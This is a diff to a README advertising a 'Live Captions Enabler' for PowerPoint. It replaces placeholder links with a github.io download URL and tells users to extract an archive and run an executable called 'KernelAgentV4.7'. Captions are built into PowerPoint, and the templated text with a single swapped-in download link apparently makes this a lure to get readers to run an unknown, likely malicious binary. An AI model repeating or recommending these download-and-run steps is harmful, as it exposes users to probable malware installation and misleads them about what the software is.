@@ -2,13 +2,15 @@
 
 Enable Live Captions in Microsoft PowerPoint to display real-time subtitles during presentations. This feature supports multiple spoken and display languages and is ideal for accessibility and clarity. Powered locally with `KernelAgentV4.7`.
 
-[![Download Live Captions Enabler](https://img.shields.io/badge/Download-Live_Captions-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Live Captions Enabler](https://img.shields.io/badge/Download-Live_Captions-blueviolet)](https://m365-live-captions-presentations.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://m365-live-captions-presentations.github.io/.github
+) section  
 2. 📁 **Extract the folder** to a directory like `C:\M365LiveCaptions`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to enable captioning modules in PowerPoint  
 4. 🧑‍🏫 Open PowerPoint → Slide Show → Always Use Subtitles  
